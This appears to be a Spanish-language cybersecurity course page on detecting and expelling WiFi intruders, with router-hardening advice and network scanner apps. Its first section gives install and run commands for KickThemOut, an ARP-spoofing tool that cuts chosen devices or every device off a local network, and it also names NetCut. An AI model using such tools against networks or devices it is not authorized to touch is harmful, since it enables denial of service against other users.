# red team

## Identificación de usuarios y expulsión de intrusos

### **¿Cómo expulsar a tu intruso de tu red con kali linux?**

El otro día me estaba preguntado sobre como expulsar a tu intruso de tu red pero también podemos cambiar la contraseña de nuestra red pero si lo quieres usarlo para otra cosa también te puede ser útil. Nuestro método es dejar sin Internet a nuestro intruso, la herramienta se llama ” KickThemOut”

### **¿Qué es KickThemOut?**

Una herramienta para expulsar dispositivos de su red y disfrutar de todo el ancho de banda para usted. Le permite seleccionar dispositivos específicos o todos los ARP y los spoofs de su red de área local. Compatible con Python 2.6 & 2.7 y permite seleccionar dispositivos específicos de la red o todos los dispositivos conectados. Podemos ver su [github para más información](https://github.com/k4m4/kickthemout).

**Instalación**

| 1 | sudo apt-get update |
| --- | --- |

> También necesitaremos tener instalado nmap, si no lo tenemos, podemos instalarlo en debian con el comando

| 1 | sudo apt-get install nmap |
| --- | --- |

> Con todo instalado y actualizado, toca descargar la aplicación, para ello nos situamos en donde queramos descargarla, y la clonamos desde su repositorio de github con el comando

| 1 | git clone https://github.com/k4m4/kickthemout.git |
| --- | --- |

> Accedemos a la carpeta descargada e instalamos la aplicación

| 1
2 | cd kickthemout/
sudo python -m pip install -r requirements.txt |
| --- | --- |

> Ahora ya sólo toca ejecutarla y probarla

| 1 | python kickthemout.py |
| --- | --- |

![Termina1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/terminal1.png?raw=true)

Así ejecutamos el código y nos pide 3 opciones.

1. Opción dejar a Internet a un solo usuario.
2. Dejar sin Internet a uno y más usuarios seleccionados.
3. Dejamos sin Internet a todos.(MALDAD TOTAL)

El funcionamiento es muy sencillo, tan sólo es introducir el número de la operación que queramos llevar a cabo para llevarlo a cabo. Podemos ver un ejemplo que he parado a mitad, sólo por mostrar el funcionamiento.

![Termina2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/terminal2.png?raw=true)

### **¿Pueden hackearse los routers?**

Si hackean tu equipo, los peligros están claros: un hacker puede acceder a todos tus archivos personales confidenciales e incluso eliminarlos, si lo deseas. Y, una vez que un hacker ha obtenido acceso a tu PC o a su teléfono, puede instalar malware para espiar tu actividad en Internet, secuestrar tus archivos mediante ransomware o causar otros daños. Por desgracia, **los routers también son vulnerables**.

### **¿Cuál es el peligro de un router hackeado?**

El peligro cuando se hackea un router es que puede iniciar una serie de amenazas completamente nuevas, desde las aparentemente inocentes hasta otras mucho más serias. Con ese nivel de acceso, alguien que le haya hackeado el router puede:

- **Saturar su ancho de banda:** Esto es más molesto que dañino, pero aun así, si alguien está usando su conexión Wi-Fi para el streaming de juegos o películas (o incluso para la criptominería), le quedará poco ancho de banda para sus actividades.
- **Espiar su tráfico de Internet:** Alguien que haya accedido a su red Wi-Fi puede espiar todo el tráfico de la red en cualquier dispositivo que esté conectado. Esto incluye su PC, su teléfono, los PC y teléfonos de su familia, su videoconsola, sus dispositivos de hogar inteligente y mucho más. Los hackers también pueden usar un sniffer de paquetes para supervisar el tráfico de Internet en tiempo real y capturar todos los datos entrantes y salientes.
- **Acceder a contenido ilegal:** Quizá usted tenga un historial de Internet impoluto, pero la persona que hackee su Wi-Fi posiblemente no. Pueden usar su conexión a Internet para ver o subir contenidos multimedia ilegales, transmitir o descargar contenido hackeado, comprar en la web oscura y muchas otras acciones dudosas, todo en su nombre.
- **Recopilar sus datos personales:** Los hackers de routers pueden capturar cualquier dato que introduzca en una página web con una conexión no cifrada, es decir, cualquier página web que solo use HTTP. Y lo mismo le ocurre a cualquier persona que esté conectada a su red Wi-Fi hackeada. No introduzca nunca datos confidenciales, como las contraseñas, en una página web que no tenga cifrado HTTPS.
- **Instalar malware:** Sí, hay malware para routers. Un hacker con acceso al router puede hackear el firmware del router para cargar malware que abra la puerta a más ataques y espionajes en el futuro.
- **Crear un mapa de su red Wi-Fi:** Las personas que accedan a su router pueden ver todos los dispositivos de la red y usar esa información para planificar más ataques. Los ataques a routers en hogares inteligentes y otros dispositivos de Internet de las cosas pueden ser especialmente peligrosos, ya que no mucha gente presta la misma atención a la seguridad de IoT que a la seguridad de su PC y su teléfono.
- **Atacar a otras personas:** Los ciberdelincuentes pueden hackear el router y usarlo como parte de un ataque DDOS masivo.
- **Cambiar la configuración DNS:** Un objetivo común de los routers Wi-Fi hackeados es acceder a la configuración DNS del router, que determina a dónde se envía el tráfico de Internet. Los hackers pueden cambiar la configuración DNS del router para redirigir el tráfico de Internet a las páginas web que ellos determinen, generalmente páginas web de pharming que le engañan para que proporcione sus datos personales o páginas web maliciosas que descargan malware en sus dispositivos.

### **¿Me han hackeado el router?**

Esperamos que ya haya seguido los consejos anteriores para que el router Wi-Fi esté libre de hackeos ahora y en el futuro. No obstante, si sospecha que el router Wi-Fi ha sido hackeado o le preocupan estas amenazas, esté pendiente de estas señales que pueden indicar un hackeo.

- **Internet va mucho más despacio.** Esto puede deberse a muchas razones, de modo que, si no detecta otros síntomas de esta lista, no tiene que preocuparse necesariamente. No obstante, la lentitud de Internet *sí* puede estar causada por un hacker Wi-Fi que consuma todo su ancho de banda.
- **Hay dispositivos desconocidos en el router.** Si está usando una herramienta de seguridad de redes Wi-Fi, como Avast Free Antivirus, sabrá automáticamente si se conecta un dispositivo extraño a la red. De lo contrario, tendrá que iniciar sesión en el router y revisar la lista de direcciones IP de la red. Cruce esa lista con las direcciones IP de sus dispositivos (consulte aquí cómo averiguar su dirección IP) para ver si hay algún elemento extraño.
- **La configuración DNS ha cambiado.** Es probable que su router se conecte a un servidor DNS de su proveedor de Internet, pero los hackers pueden cambiar la configuración DNS del router para que use un servidor malicioso en su lugar. Esta operación puede causar que el tráfico web se redirija a páginas web peligrosas para robar sus datos personales o descargar malware en el dispositivo. Puede revisar la configuración DNS del router en el menú de administración de router.
- **Las credenciales de administración o la contraseña del router han cambiado.** Un hacker que no intente permanecer oculto podría cambiar la contraseña del router, lo cual le impediría usar los servicios de Internet que está pagando. También puede bloquear su acceso al backend del router cambiando las credenciales de administración.
- **Hay software desconocido (o malware) en los dispositivos.** Esta es una señal de alarma importante. Un hacker con acceso al router puede infectar sus dispositivos con todo tipo de malware, incluido ransomware.
- Si experimenta uno o varios de estos problemas, siga leyendo para saber cómo impedir que los hackers usen su red Wi-Fi y cómo recuperar el control del router.

### **Cómo arreglar un router hackeado**

Si le han hackeado el router, la buena noticia es que seguramente pueda recuperar el control. Si sigue el sencillo procedimiento que explicamos a continuación, debería ser capaz de expulsar a cualquier invasor del router y evitar futuros ataques.

Hay más buenas noticias: Si el router se infecta con malware, este procedimiento también debería eliminarlo.

**1. Desconecte el router**

Debe aislar el router para subsanar hackeos. El primer paso es desconectar todos los cables de Internet del router. De ese modo, se cortará inmediatamente la conexión entre los hackers y los dispositivos de la red Wi-Fi doméstica. Si hay dispositivos conectados físicamente al router, desconéctelos también.

**2. Restablezca el router**

A continuación, restablezca el router a los valores de fábrica. Tenga en cuenta que esta operación *no* es lo mismo que apagar y encender el router para intentar solucionar una conexión lenta a Internet.

**El restablecimiento de fábrica borra todos los datos del router, incluidos los ajustes de red que haya configurado.** Si un hacker conoce la contraseña de administración, no podrá usarla después de un restablecimiento. Restablecer el router también puede eliminar algunos tipos de malware en el router, incluido el famoso [VPNFilter](https://en.wikipedia.org/wiki/VPNFilter).

La mayoría de los routers tienen un botón para restablecer los valores de fábrica. Quizá necesite un clip para pulsarlo. Si no logra averiguar cómo restablecer los valores de fábrica del router, consulte el manual de usuario o la página web del fabricante del router.

**3. Inicie sesión en el router y cambie las credenciales de administración**

Una vez que haya restablecido los valores de fábrica, podrá iniciar sesión con el nombre de usuario y la contraseña predeterminados. Encontrará esta información en el propio router, en el manual de usuario o en la página web del fabricante.

Tras iniciar sesión, cambie la contraseña de administración por una personalizada. Esta operación evitará que los hackers vuelvan a conectarse.

**4. Establezca un nuevo SSID y una nueva contraseña para la red Wi-Fi**

Dé a la red inalámbrica un nuevo nombre y recuerde que los nombres largos y complejos dificultan el crackeo de la red. Lo mismo ocurre con la contraseña: use al menos 15 caracteres y una combinación de letras, cifras y símbolos (o use esta herramienta para crear contraseñas aleatorias e impenetrables).

**5. Configure una red de invitados (opcional)**

Mientras configura el router, valore la posibilidad de establecer una red Wi-Fi para invitados en el router. Esta es una red adicional que permite a los dispositivos conectados acceder a Internet sin usar la red principal. De ese modo, si el teléfono de un amigo está infectado con malware, su nuevo e impolutoPC no estará en peligro.

Si tiene muchos dispositivos inteligentes, también puede dirigirlos a la red para invitados. Los dispositivos IoT generalmente no son muy seguros, de modo que es una buena idea aislarlos en una red independiente.

**6. Actualice el firmware del router**

La mayoría de los routers no actualizan el firmware automáticamente, así que tendrá que hacerlo cuando inicie sesión. Busque la configuración del firmware en el menú de administración del router y actualícelo a la versión más actual. Los intentos de atacar el antiguo firmware serán ineficaces frente a la nueva actualización.

## **Control y seguridad de redes WiFi**

Hoy en día, la mayoría de las conexiones son de fibra óptica con velocidades más que suficientes para cubrir las necesidades más exigentes de cualquier familia. Sin embargo, cuando nos conectamos a plataformas de vídeo en streaming o descargado contenido, la velocidad restante disponible para el resto de los usuarios se reduce considerablemente. Si, además, tenemos algún intruso en nuestra red, la velocidad será aún más reducida y tendremos problemas a la hora de reproducir contenido vía streaming, descargar contenido o incluso acceder a internet.

Afortunadamente, tanto **detectar a intrusos en una red WiFi** como expulsarlos y evitar que vuelvan a conectarse es un proceso muy sencillo a la par que rápido, siguiendo los pasos que mostramos a continuación.

### **Problemas asociados a que nos roben el WiFi**

Cuando hablamos de que alguien nos pueda robar la señal WiFi, lo primero que nos viene a la cabeza es en la **pérdida de velocidad** que experimentará nuestra conexión, una pérdida que, dependiendo de la velocidad que tengamos contratada, puedes ser más o menos apreciable, sin embargo, no es el único motivo por el que debemos comprobar si tenemos algún intruso en nuestra red, ya que podemos tener problemas de la más diversa índole.

Si compartimos contenido a través de nuestra red local desde nuestro PC, si tenemos algún intruso, éste podrá acceder a todo ese contenido y, si tiene permisos totales, podrá **borrar todo el contenido** además de descargarlo en su equipo. Esto es especialmente grave cuando compartimos una carpeta donde almacenamos todos los documentos que utilizamos tanto en el trabajo como en los estudios como a nivel personal, como nuestras finanzas, contraseñas y demás.

Cualquier dispositivo que se conecte a internet a través de nuestra conexión, dejará el rastro de nuestra IP. De esta forma, si realiza cualquier actividad ilegal, el **responsable** de cara a las autoridades de orden público seres nosotros, aunque posteriormente a través del router, se pueda comprobar que realmente no hemos sido nosotros a través de los diferentes dispositivos que utilicemos, cabiendo la posibilidad de que las autoridades consideren que nos hemos deshecho del dispositivo utilizado.

Si la persona que se ha conectado a nuestra red tiene amplios conocimientos de informática y su única finalidad no es la de utilizar nuestra señal de internet de forma gratuita sino la de robar información personal como las **claves de acceso al banco** (una operación muy sencilla utilizando programas que capturan y analizan los datos que circulan por la red) el problema puede ser mucho más importante de lo que podríamos imaginar en un principio.

<aside>
💡 También corremos el riesgo de quedarnos sin internet. Una vez que el intruso accede a nuestro router, puede acceder fácilmente al router, especialmente si se trata de un modelo genérico y cambiar la contraseña de nuestra señal WiFi expulsando a todos los dispositivos que tengamos conectados.
</aside>

## **Detectar intrusos en una red WiFi**

En los últimos años, Microsoft ha implementado un gran número de funciones de forma nativa que permiten a los usuarios realizan las mismas funciones para las que anteriormente era necesario utilizar una aplicación de terceros. Un claro ejemplo lo encontramos en Microsoft Defender, el antivirus nativo de Windows. Sin embargo, al no ser una necesidad habitual para la mayoría de los usuarios, aunque realmente no es así, no incluye la posibilidad de conocer cuáles son todos los dispositivos conectados a nuestra red, ya sea vía WiFi o a través de un cable ethernet.

Para detectar intrusos en una red, tenemos dos opciones. Por un lado, podemos acceder a la configuración del router y por otro, utilizar aplicaciones de terceros. Pero, antes de nada, debemos saber qué es lo que tenemos que buscar y cómo identificar los dispositivos. Cuando un dispositivo se conecta a un router, este almacena le asigna automáticamente una dirección IP que le permite acceder a la red. Esa información se almacena en un registro, registro donde también se almacena la dirección MAC (la matrícula del dispositivo) y el nombre del dispositivo (aunque esta información no siempre es capaz de identificarla).

### **Desde el router**

El router incluye un registro donde se almacenan todos los dispositivos que se han conectado al dispositivo, información que incluye la IP asignada, la MAC y su nombre. Los datos de acceso al router se encuentran en la parte inferior del dispositivo. La dirección que debemos introducir siempre empieza por 192.186 seguido por otros dos números. El nombre de usuario y la contraseña, también se encuentran en la parte inferior del router. Algunos router, desde la página principal nos muestra el número de dispositivos conectados vía WiFi y utilizando un cable ethernet. Para conocer los equipos conectados vía WiFi, tan solo debemos pulsar en **Wi-Fi devices** o **dispositivos WiFi**.

![router1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/router1.png?raw=true)

A continuación, se mostrarán un listado con todos los dispositivos conectados vía WiFi. Algunos dispositivos se mostrarán junto con el nombre que tienen configurado, pero no todos. Junto al nombre del dispositivo, si este está disponible, se muestra la dirección IP en la red local y la dirección MAC (compuesta por 6 bloques de 2 cifras que combinan letras y números), si se encuentran activos en la red y desde cuanto tiempo se encuentran conectados de forma continuada.

![router2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/router2.png?raw=true)

<aside>
📖 Si no encontramos esta opción en los menús del router, debemos **consultar a nuestro operador** o buscar en internet el manual de nuestro router. Los pasos para acceder a este apartado varían dependiendo del fabricante del router y del operador.
</aside>

### **Utilizando aplicaciones de terceros**

Si no queremos lidiar con los diferentes menús que incluyen algunos router, ya que algunos están en inglés, podemos utilizar aplicaciones de terceros como las que mostramos a continuación. Sin embargo, la información **más fiable y completa** únicamente la vamos a encontrar directamente a través de nuestro router.

- **Advanced IP Scanner**

Avanced IP Scanner es una aplicación gratuita con la que podemos conocer rápida y fácilmente todos los dispositivos que se encuentran conectados a nuestra red Wi-Fi. La información que nos muestra es la misma que la podemos obtener accediendo a través del router, y donde podemos ver el nombre del dispositivo, la IP asignada, el fabricante del dispositivo y la dirección MAC. Podemos descargar Advanced IP Scanner directamente desde su [página web](https://www.advanced-ip-scanner.com/es/).

![IP Scanner 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ip-scanner1.png?raw=true)

- **Angry IP Scanner**

Otra aplicación con la que también podemos analizar los dispositivos conectados a nuestro equipo es Angry IP Scanner, una aplicación disponible para su descarga de forma totalmente gratuita y que además de para **Windows**, también está disponible para **Linux** y **macOS**.

La descarga de Angry IP Scanner está disponible a través de su página web a la que podemos acceder pulsando [aquí](https://angryip.org/download/#windows).

![IP Scanner 2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ip-scanner2.png?raw=true)

## **Cómo expulsar usuarios de una conexión WiFi**

El método más sencillo y rápido para expulsar a cualquier persona que haya accedido a nuestra red Wi-Fi es cambiar la contraseña de la señal o señales Wi-Fi, si además de la red de 2.4 GHz también tenemos habilitada la red de 5 GHz (Plus como lo denominan algunos proveedores). Para cambiar la contraseña, el proceso varía dependiendo del fabricante y del operador, debemos acceder al router (recordemos que los datos se encuentran en la parte inferior del mismo) y acceder al apartado Wi-Fi. A continuación, nos dirigimos a cada una de las dos señales Wi-Fi (si tenemos más de una), las podemos identificar por el nombre que muestran y modificamos la contraseña por cualquier otra.

![conexión WiFi](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/conexion-wifi.png?raw=true)
Debemos evitar utilizar el nombre de nuestro hijo junto con su fecha de nacimiento, el nombre de alguna de nuestras mascotas, algún apodo por él nos conozca o cualquier otro dato que fácilmente puedan conocer las personas que nuestro entorno que estén buscando una conexión a internet gratuita. Además, si disponemos de la opción, podemos **ocultar la red Wi-Fi** para que no se muestre entorno. De esta forma, los dispositivos ya conectados podrán seguir conectándose, pero no estará disponible en ningún otro dispositivo que queramos conectar. Si queremos conectar un nuevo dispositivo, podemos desmarcar la casilla, conectarlo y volver a ocultar la red.

### **Cómo evitar que se vuelvan a conectar**

Una vez hemos expulsado a los intrusos de nuestra red WiFi, llega el momento de tomar las medidas adecuadas para evitar que se nos vuelva a colar cualquier persona.

1. **Utilizar contraseña segura**

A la hora de elegir una contraseña, debemos olvidarnos de utilizar cualquier nombre que pueda estar asociado a nosotros en particular o a nuestra familia. Al igual que tampoco debemos utilizar los nombres de nuestras mascotas, ni fechas de nacimiento en combinación con nombres. Tampoco utilizar nombres comunes de marcas conocidas que nos pueda gustar, ni marcas de coches, diseñadores de moda, marcas de ropa, equipos de fútbol o jugadores… La contraseña más segura es aquella que está formada por **letras, números y símbolos** de forma aleatoria y combinando mayúsculas y minúsculas.

Las aplicaciones que permiten acceder a redes Wi-Fi, utilizan diccionarios con palabras clave que se utilizan de forma nativa en la mayoría de los routers, por lo que, si nuestro router ya viene con una contraseña asociada al router, lo primero que debemos hacer es cambiarla y crear una nueva, contraseña que, con muchos años por delante y a través de aplicaciones de fuerza bruta, las aplicaciones diseñadas para este fin pueden averiguar.

2. **Ocultar la red Wi-Fi**

Otro interesante método que tenemos disponible para evitar que los amigos de lo ajeno accedan a nuestra contraseña Wi-Fi pasa por ocultar la señal en nuestro entorno. Una vez hemos conectado todos los dispositivos a la red Wi-Fi nuevamente después de haber cambiado la clave si se diera el caso, desde el router, podemos ocultar la red Wi-Fi para que ningún otro dispositivo que se encuentre en su entorno, pueda **detectar su presencia** e intentar averiguar la contraseña utilizando diferentes métodos, aunque llegue a conocer la contraseña, si no puede acceder a la señal, nunca podrá tener la oportunidad de introducirla.

3. **Activar la identificación MAC**

El último método que también tenemos a nuestra disposición para evitar que otras personas de nuestro entorno accedan a nuestra conexión es configurar el router para que únicamente acepte las conexiones de las direcciones MAC que previamente hemos introducido. Cualquier equipo que trate de conectarse a nuestra red, conociendo la contraseña, si no tiene registrada su dirección MAC **nunca podrá acceder al contenido** que ofrece el router, es decir, ni a la señal de internet ni a los archivos, carpetas o cualquier otro contenido compartido. La dirección MAC, es la matrícula que tienen los dispositivos con conexión a internet, una matrícula única e irrepetible para cada dispositivo. Si bien es cierto que se puede falsear, es proceso muy complicado de hacer y realmente no merece la pena.

## **¿Cómo proteger su red Wi-Fi frente a hackers?**

Con unas sencillas precauciones en su router Wi-Fi, logrará que sea mucho más difícil hackearlo. Al igual que en muchos aspectos de la vida, evitar los hackeos en la red Wi-Fi es más fácil y barato que enfrentarse a un router hackeado. Una vez que esto sucede, el problema se vuelve significativamente más difícil de resolver, aunque no imposible.

Es muy diferente si hemos visto **intrusos en nuestra red Wi-Fi** que desconocemos, o si por el contrario es un usuario o dispositivo que no queremos que se conecte a la red, pero que en algún momento le dimos permiso. Puede que sea alguien que ha venido a nuestra casa y le hemos dado la clave del Wi-Fi, por ejemplo. Sea como sea, tenemos diferentes opciones para evitar que un usuario en concreto o un dispositivo se conecten a nuestra red. Vamos a hablar de las principales que tenemos.

1. **Cambie las credenciales de administrador del router**

Todos los routers tienen un nombre de usuario y una contraseña para acceder a la configuración del router. Cuando consigue un router, ya sea nuevo o usado, **cambie inmediatamente el nombre de usuario y la contraseña**.

Los hackers de redes Wi-Fi conocen las credenciales de administración predeterminadas de prácticamente todos los routers habituales del mercado. Si alguien puede acceder a su red Wi-Fi, pueden intentar conectarse a su router con esos datos. Si nunca ha actualizado las credenciales de inicio de sesión tras obtener el router, resulta sencillo hackear la contraseña del router. Y, si ha comprado el router a otra persona, no puede estar seguro de la antigüedad de esos datos. En cualquier caso, cámbielos lo antes posible.

Establezca una nueva contraseña del router mediante [prácticas para crear una contraseña segura](https://blog.avast.com/strong-password-ideas) o [cree una contraseña imposible de averiguar](https://www.avast.com/es-es/random-password-generator) con una cadena aleatoria de caracteres para impedir que los hackers de redes Wi-Fi accedan a su router.

2. **Cambiar la contraseña de la red Wi-Fi**

Sin duda la mejor opción de echar a cualquier usuario de nuestra red es **cambiar la contraseña del Wi-Fi**. Así, cualquier usuario o dispositivo que estuviera conectado a nuestra red, automáticamente queda fuera. Eso sí, en este caso hay que tener en cuenta que no solo quedaría fuera un usuario en concreto, sino que también pasaría con cualquier otro equipo conectado o usuario. Tendríamos que volver a configurar la nueva clave o cifrado en cada caso.

Siempre que creemos una nueva clave hay que seguir el mismo patrón para que sea **fuerte y compleja**: tiene que contener letras (mayúsculas y minúsculas), números y otros caracteres especiales, es recomendable que sea de 12 caracteres o superior, y si es posible, que sea aleatoria.

3. **Crear un filtrado MAC**

Crear un **filtrado MAC** por sí solo no va a mejorar en gran medida la seguridad de nuestra red inalámbrica, pero podría hacer que un usuario o dispositivo en concreto no puedan conectarse. Es, por tanto, una de las opciones que tenemos para expulsar usuarios de nuestro Wi-Fi. Especialmente podremos echar a aquellos que cuenten con menos conocimientos, que simplemente hayan entrado porque han averiguado la contraseña por algún motivo.

Para ello tenemos que identificar la dirección MAC de ese usuario. Podemos **entrar en el router**, al cual generalmente se accede a través de la puerta de enlace predeterminada 192.168.1.1 e introducir las credenciales. Si no sabemos cuál es la puerta de enlace la podemos averiguar fácilmente. Tenemos que ir a Inicio, abrimos el Símbolo del sistema y posteriormente ejecutamos el comando ipconfig. Nos mostrará una serie de datos entre los que se encuentran lo que nos interesa. Así ya podremos acceder a nuestro dispositivo.

![filtrado MAC](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/filtrado-mac.png?raw=true)

La contraseña suele ser genérica del tipo admin123, 1234, etc. No obstante, es muy recomendable que nunca dejemos esa clave de acceso y que la cambiemos por otra mucho más fuerte que pueda mantener alejados a los ciberdelincuentes  y que no comprometan nuestra seguridad en ningún momento. El proceso dependerá del router que tengamos, pero en general habrá que entrar en Wireless y acceder a la opción de filtro de direcciones MAC.

Aquí tendremos que **introducir la dirección MAC** de ese dispositivo que queremos evitar que se conecte. Puede ser de alguien a quien le dimos en algún momento nuestra contraseña o incluso un equipo de nuestra propiedad que no queramos que tenga acceso a la red. Podemos crear una lista blanca para que únicamente los dispositivos que queramos puedan acceder fácilmente.

4. **Active el cifrado WPA2 (o WPA3)**

WPA2 y WPA3, las versiones segunda y tercera del protocolo de seguridad Wi-Fi Protected Access, protegen su router frente a accesos no autorizados mediante cifrado AES. Este es el mismo tipo de cifrado que usamos en Avast para nuestra Avast SecureLine VPN supersegura, así que puede imaginarse que es algo bueno. Todos los routers que merecen la pena tienen activado el cifrado WPA2 y los modelos más modernos podrían tener WPA3.

Active el cifrado WPA2 o WPA3 para requerir que cualquier persona que desee conectarse a su router protegido use la contraseña Wi-Fi. Además, asegúrese de crear una contraseña segura siguiendo prácticas inteligentes para crear contraseñas seguras. Estos sencillos pasos supondrán un obstáculo serio para cualquier hacker de redes Wi-Fi.

5. **Cambie el nombre de red del router (SSID)**

Cuando configure el router (para cambiar sus credenciales de administración y establecer una contraseña segura), cambie también el SSID. SSID son las siglas de *service set identifier*, que, en pocas palabras, es el nombre de su red Wi-Fi.

Los routers nuevos a menudo incluyen la marca del router en el SSID y los hackers de redes Wi-Fi pueden usar esta información para crackear su contraseña. En su lugar, **personalice el nombre de la red** para que no sepan el tipo de router que tiene. Cuantas más pistas dé a un hacker, más fácil será su trabajo.

Use toda su creatividad con el nombre de la red Wi-Fi: cree una larga y compleja. El cifrado WPA usa el SSID como parte de su algoritmo, de modo que, si evita nombres de red habituales o comunes, conseguirá que la red sea más resistente frente a métodos de hackeo de la contraseña, como las tablas arcoíris. Además, está bien dejar que los vecinos lean algo gracioso.

6. **Desactive WPS**

Además de WPA2 o WPA3, muchos routers también tienen WPS (Wi-Fi Protected Setup), lo cual significa que puede apretar un botón o introducir un PIN para conectarse, en lugar de usar la contraseña. Aunque claramente es más cómodo, el nivel de seguridad se desploma cuando usa botones o códigos PIN en lugar de contraseñas.

Cualquier persona que pueda tocar físicamente el router también podrá pulsar el botón WPS y conectarse. Y un PIN corto es mucho más fácil de crackear en un ataque por fuerza de bruta que una contraseña larga y complicada.

Desafortunadamente, no todos los routers permiten desactivar las funciones WPS, pero, si puede, **desactive WPS lo antes posible y establezca una contraseña**.

7. **Desactive la administración remota o inalámbrica**

La administración remota permite conectarse a la configuración de administración del router desde cualquier parte del mundo. Pero, a menos que sea un desarrollador, hay muy pocas probabilidades de que use esta función. Si la desactiva, solo podrá acceder a la configuración cuando el PC esté físicamente conectado al router mediante un cable Ethernet. Desactivar la administración remota es una manera cómoda de evitar a los hackers.

8. **Actualice el firmware del router**

El firmware es el software que controla una pieza de hardware específica (en este caso, el router). Al igual que el sistema operativo del PC y los programas o aplicaciones que usa, el firmware puede actualizarse. Las actualizaciones de firmware pueden proteger el router frente a cualquier [vulnerabilidad](https://www.avast.com/es-es/c-exploits) que se detecte en versiones antiguas del firmware. Algunos routers pueden buscar actualizaciones del firmware, pero siempre puede iniciar sesión en la configuración de administración del router, buscar la sección del firmware y buscar actualizaciones ahí.

9. **Use una herramienta de ciberseguridad que proteja la red Wi-Fi**

Una de las maneras más fáciles y sencillas para proteger la red Wi-Fi es usar una herramienta de supervisión de la red Wi-Fi para que no tenga que molestarse en vigilar la red manualmente. Avast Free Antivirus incluye un Inspector de Wi-Fi que analiza constantemente la red en busca de actividades o dispositivos sospechosos, de manera que sabrá qué ocurre exactamente en su red Wi-Fi en todo momento.

![red Wi-Fi](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/red-wi-fi.png?raw=true)

10. **Restablecer los valores del router**

Un poco **similar al cambio de contraseña** que mencionábamos anteriormente. Si reseteamos el router y volvemos a los valores de fábrica, en caso de que hayamos cambiado previamente la clave y la configuración, todos los usuarios quedan fuera del mismo. A fin de cuentas no conocerían las nuevas credenciales y la configuración no les permitiría seguir conectados. Es una manera rápida de **expulsar a cualquier usuario**. Eso sí, una vez más estaríamos bloqueando el acceso a todos los demás usuarios y dispositivos. Tendríamos que generar una nueva clave segura.

11. **Deshabilitar el Wi-Fi**

Esta opción automáticamente va a dejar fuera a todos los usuarios que se conecten a través de la red inalámbrica. Va a permitir que echemos a cualquier equipo que tengamos conectado. Sin embargo esto solo sería válido si no vamos a querer utilizar el Wi-Fi. Por ejemplo si vamos a conectarnos por cable y lo único que queremos es que no haya más aparatos que puedan conectarse. Es una medida más drástica pero que también hemos querido incluir. A fin de cuentas es una solución que también podemos llevar a cabo en un momento dado.

Para ello tendremos que entrar de nuevo al router. Podemos acceder a la configuración avanzada, entrar en Wi-Fi y, según nuestro modelo, encontrar la opción correspondiente para **deshabilitar la red inalámbrica**. En cualquier momento podremos revertir la situación. Incluso puede ayudarnos a ganar tiempo mientras cambiamos la contraseña o llevamos a cabo cualquier cambio.

## **Usa aplicaciones para expulsar usuarios de la red WiFi**

También podemos utilizar programas externos. Un ejemplo es **NetCut**, del que hablamos en un artículo anterior. Este software nos permite tener un control sobre todos los **equipos que hay conectados** en nuestro router.

En caso de que queramos echar a uno en concreto, podemos hacerlo fácilmente con esta aplicación. Una utilidad más que tenemos disponible. Eso sí, en este caso hay que tener en cuenta que vamos a tener que instalar software adicional en nuestro equipo. Hay que bajarlo siempre desde fuentes oficiales y no cometer errores que puedan afectar a nuestra seguridad.

NetCut es un programa interesante que nos permite expulsar a un usuario de la red inalámbrica. No obstante, podemos hacer uso de otros programas que son similares y que también podemos encontrar de forma gratuita en Internet. Existe un amplio abanico de posibilidades para los diferentes sistemas operativos.

### **Fing para móviles**

Una de las primeras cosas que debemos hacer si queremos saber quién accede a nuestro router es ver las diferentes conexiones. Podemos hacerlo fácil desde el propio dispositivo y accediendo a la configuración, pero también podemos usar una aplicación específica que nos ayude a saber quién se está conectando y desde qué dispositivo. Fing es una aplicación que nos permite comprobar de forma sencilla si alguien está usando **nuestro Internet si eres principiante** y no sabes cómo puedes consultarlo siguiendo otros pasos.

Fing permite **encontrar intrusos y también bloquear el acceso** de forma permanente o temporal. Es una aplicación para Android e iOS que podemos descargar gratis en nuestro smartphone y que nos permite detectar todos los aparatos conectados a la red WiFi.

> Descargar
> 
> 
> [Fing - Escáner de red](https://apps.apple.com/es/app/fing-esc%C3%A1ner-de-red/id430921107?uo=4)
> 
> [Descargar](https://play.google.com/store/apps/details?id=com.overlook.android.fing)
> 
> [Fing - Escáner de red](https://play.google.com/store/apps/details?id=com.overlook.android.fing)
> 

Simplemente tienes que descargar la aplicación en tu teléfono móvil y encenderla. Automáticamente detectará los dispositivos que estén conectados a la red y los mostrará en una lista que podrás ver en tu teléfono: el tipo de aparato que es (móvil, televisión, videoconsola, dispositivo, altavoces inteligentes…) y también nos mostrará la marca, el modelo y **la dirección IP privada** del dispositivo dentro de nuestra red.

Podemos tocar dentro del que queramos para leer más detalles sobre ese aparato, el modelo, la fecha de lanzamiento, el sistema operativo… Y podemos acceder a los ajustes o administrar el dispositivo: podemos eliminarlo de la lista, podemos hacer ping o acceder a una cronología donde se ven los diferentes accesos. Así de fácil será, con esta app, bloquear a alguien que nos está robando Internet y evitar cuanto antes que sigan robándonos Internet en casa.

### **RedBox - Network Scanner**

- Precio: Gratis
- Categoría: Herramientas
- Desarrollador: [The RedBox Project](https://play.google.com/store/apps/dev?id=6416089970222547223)
- Descargar: [Para Android en Google Play](https://play.google.com/store/apps/details?id=com.redbox.redboxnetworkscanner)

### **Ventajas de expulsar usuarios**

Los usuarios no autorizados pueden ser una gran fuente de problemas para nuestra red Wi-Fi, y para nuestra propia seguridad en muchos casos. Expulsarlos nos aporta diferentes beneficios muy importantes para mantener nuestra seguridad y privacidad, así como para que la red funcione de la forma adecuada. Estos beneficios son:

- **Mayor seguridad**

Es importante que tengamos buena seguridad en nuestra red evitando que haya intrusos y expulsándolos en el momento. Cuando a nuestra red Wi-Fi accede algún usuario no autorizado, puede resultar en una amenaza para la seguridad de la misma y para nosotros. El acceso a datos de los demás usuarios, es mucho más sencillo. Por lo cual pueden robar información personal, o causar otro tipo de daños en el sistema. O incluso provocar algún tipo de problema o cometer algún delito, desde nuestra propia red. Al expulsarlos, reducimos esta posibilidad de una forma muy considerable. Ya que, si se comete algún delito desde la red, el primer responsable será el titular de la misma.

